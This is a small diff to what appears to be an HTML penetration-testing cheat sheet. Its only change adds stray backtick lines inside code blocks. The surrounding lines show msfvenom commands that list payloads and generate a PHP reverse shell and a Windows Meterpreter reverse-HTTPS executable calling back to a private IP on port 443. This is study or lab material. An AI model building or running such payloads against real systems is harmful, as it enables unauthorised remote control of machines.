@@ -598,6 +598,7 @@ retr 1
 <h5>MsfVenom</h5>
 <p>List payloads.</p>
 <pre><code>msfvenom -l payloads --platform windows --arch x64
+`
 </code></pre>
 <p>List payload options.</p>
 <pre><code>msfvenom --platform windows --arch x64 -p windows/x64/meterpreter_reverse_https --list-options
@@ -610,9 +611,11 @@ retr 1
 </code></pre>
 <p>PHP reverse shell.</p>
 <pre><code>msfvenom -p php/reverse_php LHOST=192.168.45.182 LPORT=443 --platform php -o webrevshell.php
+`
 </code></pre>
 <p>Win x64 reverse HTTPS.</p>
 <pre><code>msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.182 LPORT=443 -f exe -o met.exe
+`
 </code></pre>
 <p><em>HTTPS Basic Options</em></p>
 <pre><code>Name        Current Setting  Required  Description
